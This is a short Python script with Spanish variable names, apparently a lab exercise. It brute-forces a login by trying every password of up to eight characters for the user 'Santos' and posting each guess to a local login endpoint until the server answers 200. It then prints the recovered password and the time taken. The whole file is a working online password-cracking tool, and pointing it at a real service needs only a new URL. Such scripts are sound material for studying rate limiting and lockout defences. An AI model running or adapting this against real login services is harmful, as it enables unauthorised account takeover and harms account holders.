import time
import requests
import itertools

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-@"
username = "Santos"

intentos = 0
inicio = time.time()

longitud = 1
encontrado = False

while not encontrado and longitud <= 8:
    
    for combinacion in itertools.product(alphabet, repeat=longitud):
        intento = "".join(combinacion)
        intentos += 1

        print(intento) 

        response = requests.post(
            "http://127.0.0.1:8000/login",
            json={"username": username, "password": intento}
        )

        if response.status_code == 200:
            encontrado = True
            break

    longitud += 1

fin = time.time()

if encontrado:
    print("Contraseña encontrada:", intento)
    print("Intentos:", intentos)
    print("Tiempo:", fin - inicio, "segundos")
else:
    print("No se encontró la contraseña")
